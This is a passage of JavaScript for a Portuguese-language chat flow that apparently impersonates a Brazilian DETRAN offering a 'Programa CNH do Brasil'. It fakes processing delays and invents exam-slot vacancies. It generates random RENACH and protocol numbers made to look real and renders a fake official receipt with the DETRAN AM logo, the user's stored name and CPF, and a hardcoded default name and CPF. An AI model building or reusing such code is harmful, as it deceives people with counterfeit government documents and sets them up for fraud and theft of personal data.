        const userMessage = document.createElement('div');
        userMessage.className = 'mb-4 text-right';
        userMessage.style.cssText = 'margin-bottom: 1rem; text-align: right;';
        
        const userBubble = document.createElement('div');
        userBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-100 text-gray-800 rounded-tr-sm';
        userBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(243, 244, 246); color: rgb(31, 41, 55); border-top-right-radius: 0.5rem; line-height: 1.5;';
        userBubble.textContent = 'prosseguir';
        
        userMessage.appendChild(userBubble);
        messagesContainer.appendChild(userMessage);
        
        // Mostrar loading
        const loadingDiv = document.createElement('div');
        loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-200 text-gray-600 rounded-tl-sm';
        loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 0.1rem 1rem 1rem;; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(229, 231, 235); color: rgb(75, 85, 99); border-top-left-radius: 0.5rem;';
        loadingDiv.innerHTML = '<div style="display: flex; align-items: center; gap: 8px;"><div class="animate-spin" style="width: 16px; height: 16px; border: 2px solid rgb(107, 114, 128); border-top: 2px solid rgb(19, 81, 180); border-radius: 50%; animation: spin 1s linear infinite;"></div>Processando...</div>';
        
        messagesContainer.appendChild(loadingDiv);
        
        // Simular processamento
        setTimeout(() => {
            // Transformar loading em mensagem do sistema sobre etapas
            loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
            loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.5rem; line-height: 1.5;';
            loadingDiv.innerHTML = `O Programa CNH do Brasil segue as seguintes etapas: o candidato realiza as aulas teóricas através do aplicativo oficial e, após a conclusão, o ${detranName} disponibilizará um instrutor credenciado, sem custo adicional, para a realização das aulas práticas obrigatórias.`;
            
            // Adicionar botão PROSSEGUIR
            const proceedBtnContainer = document.createElement('div');
            proceedBtnContainer.className = 'flex justify-center mt-4';
            proceedBtnContainer.style.cssText = 'display: flex; justify-content: center; margin-top: 1rem;';
            
            const proceedBtn = document.createElement('button');
            proceedBtn.className = 'bg-[#1351B4] text-white px-6 py-2 rounded-lg font-semibold hover:bg-[#0D3A8C] transition-colors';
            proceedBtn.style.cssText = 'background-color: rgb(19, 81, 180); color: white; padding: 0.5rem 1.5rem; border-radius: 0.5rem; font-weight: 600; font-family: Rawline, system-ui, sans-serif; cursor: pointer; transition: all 0.3s; border: none; font-size: 14px;';
            proceedBtn.textContent = 'PROSSEGUIR >>';
            
            proceedBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                this.showThirdMessage(detranName, categoryId);
            });
            
            proceedBtnContainer.appendChild(proceedBtn);
            messagesContainer.appendChild(proceedBtnContainer);
            messagesContainer.id = 'chat-options';
            
            // Scroll para o final
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
            
        }, 1500);
    }

    showThirdMessage(detranName, categoryId) {
        console.log('showThirdMessage iniciado');
        const optionsContainer = document.getElementById('chat-options');
        let messagesContainer = document.getElementById('chat-messages');
        
        // Tentar encontrar o container de mensagens de formas alternativas
        if (!messagesContainer) {
            messagesContainer = document.querySelector('#chat-messages');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('[id*="chat-messages"]');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('.overflow-y-auto');
        }
        
        // Verificação final
        if (!messagesContainer) {
            console.error('Container de mensagens não encontrado');
            return;
        }
        
        // Remover botão PROSSEGUIR (verificar se existe)
        if (optionsContainer) {
            optionsContainer.remove();
        }
        
        // Adicionar mensagem do usuário "prosseguir"
        const userMessage = document.createElement('div');
        userMessage.className = 'mb-4 text-right';
        userMessage.style.cssText = 'margin-bottom: 1rem; text-align: right;';
        
        const userBubble = document.createElement('div');
        userBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-100 text-gray-800 rounded-tr-sm';
        userBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(243, 244, 246); color: rgb(31, 41, 55); border-top-right-radius: 0.5rem; line-height: 1.5;';
        userBubble.textContent = 'prosseguir';
        
        userMessage.appendChild(userBubble);
        messagesContainer.appendChild(userMessage);
        
        // Mostrar loading
        const loadingDiv = document.createElement('div');
        loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-200 text-gray-600 rounded-tl-sm';
        loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 0.1rem 1rem 1rem;; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(229, 231, 235); color: rgb(75, 85, 99); border-top-left-radius: 0.5rem;';
        loadingDiv.innerHTML = '<div style="display: flex; align-items: center; gap: 8px;"><div class="animate-spin" style="width: 16px; height: 16px; border: 2px solid rgb(107, 114, 128); border-top: 2px solid rgb(19, 81, 180); border-radius: 50%; animation: spin 1s linear infinite;"></div>Processando...</div>';
        
        messagesContainer.appendChild(loadingDiv);
        
        // Simular processamento
        setTimeout(() => {
            // Transformar loading em mensagem do sistema sobre avaliações
            loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
            loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.5rem; line-height: 1.5;';
            loadingDiv.innerHTML = `As avaliações teóricas e práticas encontram-se disponíveis para agendamento. Para finalização do cadastro, é necessário selecionar o período para realização das provas. Conforme a legislação vigente, o processo completo tem duração inferior a 20 dias úteis.`;
            
            // Adicionar botão PROSSEGUIR
            const proceedBtnContainer = document.createElement('div');
            proceedBtnContainer.className = 'flex justify-center mt-4';
            proceedBtnContainer.style.cssText = 'display: flex; justify-content: center; margin-top: 1rem;';
            
            const proceedBtn = document.createElement('button');
            proceedBtn.className = 'bg-[#1351B4] text-white px-6 py-2 rounded-lg font-semibold hover:bg-[#0D3A8C] transition-colors';
            proceedBtn.style.cssText = 'background-color: rgb(19, 81, 180); color: white; padding: 0.5rem 1.5rem; border-radius: 0.5rem; font-weight: 600; font-family: Rawline, system-ui, sans-serif; cursor: pointer; transition: all 0.3s; border: none; font-size: 14px;';
            proceedBtn.textContent = 'PROSSEGUIR >>';
            
            proceedBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                this.showFourthMessage(detranName, categoryId);
            });
            
            proceedBtnContainer.appendChild(proceedBtn);
            messagesContainer.appendChild(proceedBtnContainer);
            messagesContainer.id = 'chat-options';
            
            // Scroll para o final
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
            
        }, 1500);
    }

    showFourthMessage(detranName, categoryId) {
        console.log('showFourthMessage iniciado');
        const optionsContainer = document.getElementById('chat-options');
        let messagesContainer = document.getElementById('chat-messages');
        
        // Tentar encontrar o container de mensagens de formas alternativas
        if (!messagesContainer) {
            messagesContainer = document.querySelector('#chat-messages');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('[id*="chat-messages"]');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('.overflow-y-auto');
        }
        
        // Verificação final
        if (!messagesContainer) {
            console.error('Container de mensagens não encontrado');
            return;
        }
        
        // Remover botão PROSSEGUIR (verificar se existe)
        if (optionsContainer) {
            optionsContainer.remove();
        }
        
        // Adicionar mensagem do usuário "prosseguir"
        const userMessage = document.createElement('div');
        userMessage.className = 'mb-4 text-right';
        userMessage.style.cssText = 'margin-bottom: 1rem; text-align: right;';
        
        const userBubble = document.createElement('div');
        userBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-100 text-gray-800 rounded-tr-sm';
        userBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(243, 244, 246); color: rgb(31, 41, 55); border-top-right-radius: 0.5rem; line-height: 1.5;';
        userBubble.textContent = 'prosseguir';
        
        userMessage.appendChild(userBubble);
        messagesContainer.appendChild(userMessage);
        
        // Adicionar quarta mensagem do sistema
        const systemMessage = document.createElement('div');
        systemMessage.className = 'mb-4 text-left';
        systemMessage.style.cssText = 'margin-bottom: 1rem; text-align: left;';
        
        const systemBubble = document.createElement('div');
        systemBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
        systemBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.5rem; line-height: 1.5;';
        systemBubble.innerHTML = `As avaliações teóricas e práticas encontram-se disponíveis para agendamento. Para finalização do cadastro, é necessário selecionar o período para realização das provas. Conforme a legislação vigente, o processo completo tem duração inferior a 20 dias úteis.`;
        
        systemMessage.appendChild(systemBubble);
        messagesContainer.appendChild(systemMessage);
        
        // Adicionar quinta mensagem do sistema sobre seleção de meses
        const monthSelectionMessage = document.createElement('div');
        monthSelectionMessage.className = 'mb-4 text-left';
        monthSelectionMessage.style.cssText = 'margin-bottom: 1rem; text-align: left;';
        
        const monthBubble = document.createElement('div');
        monthBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
        monthBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.5rem; line-height: 1.5;';
        monthBubble.textContent = 'Selecione o mês de sua preferência para realização das avaliações:';
        
        monthSelectionMessage.appendChild(monthBubble);
        messagesContainer.appendChild(monthSelectionMessage);
        
        // Adicionar grid de meses
        const monthsGrid = document.createElement('div');
        monthsGrid.className = 'grid grid-cols-2 sm:grid-cols-3 gap-3 max-w-full mt-4';
        monthsGrid.style.cssText = 'display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.75rem; max-width: 100%; margin-top: 1rem;';
        monthsGrid.id = 'chat-options';
        
        // Dados dos meses
        const monthsData = [
            { name: 'ABRIL/2026', vacancies: 13 },
            { name: 'MAIO/2026', vacancies: 13 },
            { name: 'JUNHO/2026', vacancies: 24 },
            { name: 'JULHO/2026', vacancies: 21 },
            { name: 'AGOSTO/2026', vacancies: 23 },
            { name: 'SETEMBRO/2026', vacancies: 19 },
            { name: 'OUTUBRO/2026', vacancies: 17 },
            { name: 'NOVEMBRO/2026', vacancies: 22 },
            { name: 'DEZEMBRO/2026', vacancies: 15 }
        ];
        
        monthsData.forEach(month => {
            const monthBtn = document.createElement('button');
            monthBtn.className = 'flex flex-col items-center p-3 bg-gradient-to-b from-gray-100 to-white border border-gray-300 rounded-sm shadow-md hover:shadow-lg hover:border-[#1351B4] transition-all';
            monthBtn.style.cssText = 'display: flex; flex-direction: column; align-items: center; padding: 0.75rem; background: linear-gradient(to bottom, rgb(243, 244, 246), white); border: 1px solid rgb(209, 213, 219); border-radius: 0.125rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); transition: all 0.15s ease-in-out; cursor: pointer;';
            
            monthBtn.addEventListener('mouseenter', () => {
                monthBtn.style.boxShadow = '0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05)';
                monthBtn.style.borderColor = 'rgb(19, 81, 180)';
            });
            
            monthBtn.addEventListener('mouseleave', () => {
                monthBtn.style.boxShadow = '0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06)';
                monthBtn.style.borderColor = 'rgb(209, 213, 219)';
            });
            
            const monthName = document.createElement('span');
            monthName.className = 'font-medium text-gray-800 text-sm';
            monthName.style.cssText = 'font-weight: 500; color: rgb(31, 41, 55); font-size: 0.875rem;';
            monthName.textContent = month.name;
            
            const vacanciesSpan = document.createElement('span');
            vacanciesSpan.className = 'text-xs text-[#1351B4] font-semibold mt-1';
            vacanciesSpan.style.cssText = 'font-size: 0.75rem; color: rgb(19, 81, 180); font-weight: 600; margin-top: 0.25rem;';
            vacanciesSpan.textContent = `${month.vacancies} vagas`;
            
            monthBtn.appendChild(monthName);
            monthBtn.appendChild(vacanciesSpan);
            
            monthBtn.addEventListener('click', () => {
                this.handleMonthSelection(month.name, month.vacancies, detranName, categoryId);
            });
            
            monthsGrid.appendChild(monthBtn);
        });
        
        messagesContainer.appendChild(monthsGrid);
        
        // Scroll para o final
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
    }

    handleMonthSelection(monthName, vacancies, detranName, categoryId) {
        const optionsContainer = document.getElementById('chat-options');
        const messagesContainer = document.getElementById('chat-messages');
        
        // Adicionar loading
        const loadingDiv = document.createElement('div');
        loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-200 text-gray-600 rounded-tl-sm';
        loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 0.1rem 1rem 1rem;; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(229, 231, 235); color: rgb(75, 85, 99); border-top-left-radius: 0.5rem;';
        loadingDiv.innerHTML = '<div style="display: flex; align-items: center; gap: 8px;"><div class="animate-spin" style="width: 16px; height: 16px; border: 2px solid rgb(107, 114, 128); border-top: 2px solid rgb(19, 81, 180); border-radius: 50%; animation: spin 1s linear infinite;"></div>Processando seleção...</div>';
        
        messagesContainer.appendChild(loadingDiv);
        
        // Desabilitar botões
        const buttons = optionsContainer.querySelectorAll('button');
        buttons.forEach(btn => {
            btn.disabled = true;
            btn.style.opacity = '0.5';
            btn.style.cursor = 'not-allowed';
        });
        
        setTimeout(() => {
            // Remover loading e botões
            loadingDiv.remove();
            optionsContainer.remove();
            
            // Adicionar mensagem do usuário
            const userMessage = document.createElement('div');
            userMessage.className = 'mb-4 text-right';
            userMessage.style.cssText = 'margin-bottom: 1rem; text-align: right;';
            
            const userBubble = document.createElement('div');
            userBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-100 text-gray-800 rounded-tr-sm';
            userBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(243, 244, 246); color: rgb(31, 41, 55); border-top-right-radius: 0.5rem; line-height: 1.5;';
            userBubble.textContent = `${monthName} - ${vacancies} vagas`;
            
            userMessage.appendChild(userBubble);
            messagesContainer.appendChild(userMessage);
            
            // Mensagem sobre geração do RENACH
            const renachMessage = document.createElement('div');
            renachMessage.className = 'mb-4 text-left';
            renachMessage.style.cssText = 'margin-bottom: 1rem; text-align: left;';
            
            const renachBubble = document.createElement('div');
            renachBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
            renachBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.5rem; line-height: 1.5;';
            
            // Gerar número RENACH aleatório
            const renachNumber = this.generateRenachNumber();
            const protocolNumber = this.generateProtocolNumber();
            const userName = localStorage.getItem('userName') || 'ALBERTINO GOMES DOS REIS DE CARVALHO';
            const userCpf = localStorage.getItem('userCpf') || '233.527.348-52';
            const currentDate = new Date();
            const formattedDate = `${currentDate.getDate().toString().padStart(2, '0')}/${(currentDate.getMonth() + 1).toString().padStart(2, '0')}/${currentDate.getFullYear()} às ${currentDate.getHours().toString().padStart(2, '0')}:${currentDate.getMinutes().toString().padStart(2, '0')}`;
            
            renachBubble.innerHTML = `Prezado(a) Albertino, seu número de RENACH foi gerado com sucesso junto ao ${detranName}.<br><br>Número do RENACH: <strong>${renachNumber}</strong><br><br>O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identificação único do candidato no Sistema Nacional de Habilitação.`;
            
            renachMessage.appendChild(renachBubble);
            messagesContainer.appendChild(renachMessage);
            
            // Criar comprovante oficial
            const documentContainer = document.createElement('div');
            documentContainer.className = 'w-full mt-4 mb-4';
            documentContainer.style.cssText = 'width: 100%; margin-top: 1rem; margin-bottom: 1rem;';
            
            const documentCard = document.createElement('div');
            documentCard.className = 'bg-white border border-gray-300 rounded shadow-md';
            documentCard.style.cssText = 'background-color: white; border: 1px solid rgb(209, 213, 219); border-radius: 0.375rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); font-family: Arial, sans-serif; font-size: 12px;';
            
            // Header do documento
            const documentHeader = document.createElement('div');
            documentHeader.className = 'bg-gray-50 p-2 border-b border-gray-200 flex items-center justify-between';
            documentHeader.style.cssText = 'background-color: rgb(249, 250, 251); padding: 0.5rem; border-bottom: 1px solid rgb(229, 231, 235); display: flex; align-items: center; justify-content: space-between;';
            
            const logoContainer = document.createElement('div');
            logoContainer.className = 'flex items-center gap-2';
            logoContainer.style.cssText = 'display: flex; align-items: center; gap: 0.5rem;';
            
            const logoImg = document.createElement('img');
            logoImg.src = 'https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png';
            logoImg.alt = 'DETRAN AM';
            logoImg.className = 'h-8 max-w-[100px] object-contain';
            logoImg.style.cssText = 'height: 2rem; max-width: 100px; object-fit: contain;';
            
            logoContainer.appendChild(logoImg);
            documentHeader.appendChild(logoContainer);
            
            const protocolSpan = document.createElement('span');
            protocolSpan.className = 'text-gray-500 text-xs';
            protocolSpan.style.cssText = 'color: rgb(107, 114, 128); font-size: 0.75rem;';
            protocolSpan.textContent = `Protocolo: ${protocolNumber}`;
            
            documentHeader.appendChild(protocolSpan);
            documentCard.appendChild(documentHeader);
            
            // Corpo do documento
            const documentBody = document.createElement('div');
            documentBody.className = 'p-3';
            documentBody.style.cssText = 'padding: 0.75rem;';
            
            // Título
            const titleContainer = document.createElement('div');
            titleContainer.className = 'text-center mb-2';
            titleContainer.style.cssText = 'text-align: center; margin-bottom: 0.5rem;';
            
            const titleP = document.createElement('p');
            titleP.className = 'text-xs font-bold text-gray-700';
            titleP.style.cssText = 'font-size: 0.75rem; font-weight: 700; color: rgb(55, 65, 81);';
            titleP.textContent = 'COMPROVANTE DE CADASTRO - RENACH';
            
            titleContainer.appendChild(titleP);
            documentBody.appendChild(titleContainer);
            
            // Nome e CPF
            const nameCpfGrid = document.createElement('div');
            nameCpfGrid.className = 'grid grid-cols-2 gap-2 mb-2';
            nameCpfGrid.style.cssText = 'display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem; margin-bottom: 0.5rem;';
            
            const nameDiv = document.createElement('div');
            const nameLabel = document.createElement('p');
            nameLabel.className = 'text-gray-400 text-[10px]';
            nameLabel.style.cssText = 'color: rgb(156, 163, 175); font-size: 10px;';
            nameLabel.textContent = 'NOME';
            nameDiv.appendChild(nameLabel);
            
            const nameValue = document.createElement('p');
            nameValue.className = 'font-semibold text-gray-800 text-xs';
            nameValue.style.cssText = 'font-weight: 600; color: rgb(31, 41, 55); font-size: 0.75rem;';
            nameValue.textContent = userName.toUpperCase();
            nameDiv.appendChild(nameValue);
            
            const cpfDiv = document.createElement('div');
            const cpfLabel = document.createElement('p');
            cpfLabel.className = 'text-gray-400 text-[10px]';
            cpfLabel.style.cssText = 'color: rgb(156, 163, 175); font-size: 10px;';
            cpfLabel.textContent = 'CPF';
            cpfDiv.appendChild(cpfLabel);
            
            const cpfValue = document.createElement('p');
            cpfValue.className = 'font-semibold text-gray-800 text-xs';
            cpfValue.style.cssText = 'font-weight: 600; color: rgb(31, 41, 55); font-size: 0.75rem;';
            cpfValue.textContent = userCpf;
            cpfDiv.appendChild(cpfValue);
            
            nameCpfGrid.appendChild(nameDiv);
            nameCpfGrid.appendChild(cpfDiv);
            documentBody.appendChild(nameCpfGrid);
            
            // RENACH e Categoria (destaque azul)
            const renachCategoryDiv = document.createElement('div');
            renachCategoryDiv.className = 'bg-blue-50 p-2 rounded mb-2';
            renachCategoryDiv.style.cssText = 'background-color: rgb(239, 246, 255); padding: 0.5rem; border-radius: 0.375rem; margin-bottom: 0.5rem;';
            
            const renachCategoryGrid = document.createElement('div');
            renachCategoryGrid.className = 'grid grid-cols-2 gap-2';
            renachCategoryGrid.style.cssText = 'display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem;';
            
            const renachDiv = document.createElement('div');
            const renachLabel = document.createElement('p');
            renachLabel.className = 'text-gray-400 text-[10px]';
            renachLabel.style.cssText = 'color: rgb(156, 163, 175); font-size: 10px;';
            renachLabel.textContent = 'Nº RENACH';
            renachDiv.appendChild(renachLabel);
            
            const renachValue = document.createElement('p');
            renachValue.className = 'font-bold text-[#1351B4] text-sm';
            renachValue.style.cssText = 'font-weight: 700; color: rgb(19, 81, 180); font-size: 0.875rem;';
            renachValue.textContent = renachNumber;
            renachDiv.appendChild(renachValue);
            
            const categoryDiv = document.createElement('div');
            const categoryLabel = document.createElement('p');
            categoryLabel.className = 'text-gray-400 text-[10px]';
            categoryLabel.style.cssText = 'color: rgb(156, 163, 175); font-size: 10px;';
            categoryLabel.textContent = 'CATEGORIA';
            categoryDiv.appendChild(categoryLabel);
            
            const categoryValue = document.createElement('p');
            categoryValue.className = 'font-bold text-gray-800 text-sm';
            categoryValue.style.cssText = 'font-weight: 700; color: rgb(31, 41, 55); font-size: 0.875rem;';
            categoryValue.textContent = categoryId;
            categoryDiv.appendChild(categoryValue);
            
            renachCategoryGrid.appendChild(renachDiv);
            renachCategoryGrid.appendChild(categoryDiv);
            renachCategoryDiv.appendChild(renachCategoryGrid);
            documentBody.appendChild(renachCategoryDiv);
            
            // Mês e Status
            const monthStatusGrid = document.createElement('div');
            monthStatusGrid.className = 'grid grid-cols-2 gap-2 mb-2';
            monthStatusGrid.style.cssText = 'display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem; margin-bottom: 0.5rem;';
            
            const monthDiv = document.createElement('div');
            const monthLabel = document.createElement('p');
            monthLabel.className = 'text-gray-400 text-[10px]';
            monthLabel.style.cssText = 'color: rgb(156, 163, 175); font-size: 10px;';
            monthLabel.textContent = 'MÊS PREVISTO';
            monthDiv.appendChild(monthLabel);
            
            const monthValue = document.createElement('p');
            monthValue.className = 'font-semibold text-gray-800 text-xs';
            monthValue.style.cssText = 'font-weight: 600; color: rgb(31, 41, 55); font-size: 0.75rem;';
            monthValue.textContent = monthName;
            monthDiv.appendChild(monthValue);
            
            const statusDiv = document.createElement('div');
            const statusLabel = document.createElement('p');
            statusLabel.className = 'text-gray-400 text-[10px]';
            statusLabel.style.cssText = 'color: rgb(156, 163, 175); font-size: 10px;';
            statusLabel.textContent = 'STATUS';
            statusDiv.appendChild(statusLabel);
            
            const statusValue = document.createElement('p');
            statusValue.className = 'font-bold text-orange-600 text-xs';
            statusValue.style.cssText = 'font-weight: 700; color: rgb(251, 146, 60); font-size: 0.75rem;';
            statusValue.textContent = 'PENDENTE';
            statusDiv.appendChild(statusValue);
            
            monthStatusGrid.appendChild(monthDiv);
            monthStatusGrid.appendChild(statusDiv);
            documentBody.appendChild(monthStatusGrid);
            
            // Data de emissão
            const footerDiv = document.createElement('div');
            footerDiv.className = 'border-t border-gray-200 pt-2 text-[10px] text-gray-400';
            footerDiv.style.cssText = 'border-top: 1px solid rgb(229, 231, 235); padding-top: 0.5rem; font-size: 10px; color: rgb(156, 163, 175);';
            
            const footerP = document.createElement('p');
            footerP.textContent = `Emitido em ${formattedDate}`;
            footerDiv.appendChild(footerP);
            
            documentBody.appendChild(footerDiv);
            documentCard.appendChild(documentBody);
            documentContainer.appendChild(documentCard);
            messagesContainer.appendChild(documentContainer);
            
            // Botão PROSSEGUIR final
            const finalBtnContainer = document.createElement('div');
            finalBtnContainer.className = 'flex flex-col gap-3 max-w-[80%] mt-4';
            finalBtnContainer.style.cssText = 'display: flex; flex-direction: column; gap: 0.75rem; max-width: 80%; margin-top: 1rem;';
            
            const finalBtn = document.createElement('button');
            finalBtn.className = 'flex items-center justify-center gap-2 p-3 bg-[#1351B4] text-white rounded-sm shadow-md hover:bg-[#0D3A8C] transition-all';
            finalBtn.style.cssText = 'display: flex; align-items: center; justify-content: center; gap: 0.5rem; padding: 0.75rem; background-color: rgb(19, 81, 180); color: white; border-radius: 0.125rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); transition: all 0.15s ease-in-out; cursor: pointer; border: none;';
            
            const btnText = document.createElement('span');
            btnText.className = 'font-medium text-sm';
            btnText.style.cssText = 'font-weight: 500; font-size: 0.875rem;';
            btnText.textContent = 'Prosseguir';
            
            const arrowIcon = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
            arrowIcon.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
            arrowIcon.setAttribute('width', '24');
            arrowIcon.setAttribute('height', '24');
            arrowIcon.setAttribute('viewBox', '0 0 24 24');
            arrowIcon.setAttribute('fill', 'none');
            arrowIcon.setAttribute('stroke', 'currentColor');
            arrowIcon.setAttribute('stroke-width', '2');
            arrowIcon.setAttribute('stroke-linecap', 'round');
            arrowIcon.setAttribute('stroke-linejoin', 'round');
            arrowIcon.className = 'lucide lucide-chevron-right w-4 h-4';
            arrowIcon.style.cssText = 'width: 1rem; height: 1rem;';
            
            const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
            path.setAttribute('d', 'm9 18 6-6-6-6');
            arrowIcon.appendChild(path);
            
            finalBtn.appendChild(btnText);
            finalBtn.appendChild(arrowIcon);
            
            finalBtn.addEventListener('click', () => {
                // Voltar para a tela inicial
                localStorage.removeItem('loginBuilderState');
                window.location.href = '/';
            });
            
            finalBtnContainer.appendChild(finalBtn);
            messagesContainer.appendChild(finalBtnContainer);
            
            // Scroll para o final
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
            
        }, 1500);
    }

    handleDocumentConfirmation(optionId, detranName, categoryId) {
        // Este método não será mais usado no novo fluxo
        // Mantido para compatibilidade
    }

    generateRenachNumber() {
        // Gerar número RENACH com 11 dígitos (formato real)
        const digits = [];
        for (let i = 0; i < 11; i++) {
            digits.push(Math.floor(Math.random() * 10));
        }
        return digits.join('');
    }

    generateProtocolNumber() {
        // Gerar número de protocolo no formato YYYYXXXXXXXXX
        const year = new Date().getFullYear();
        const random = Math.floor(Math.random() * 10000000000); // 10 dígitos
        return `${year}${random.toString().padStart(10, '0')}`;
    }
}
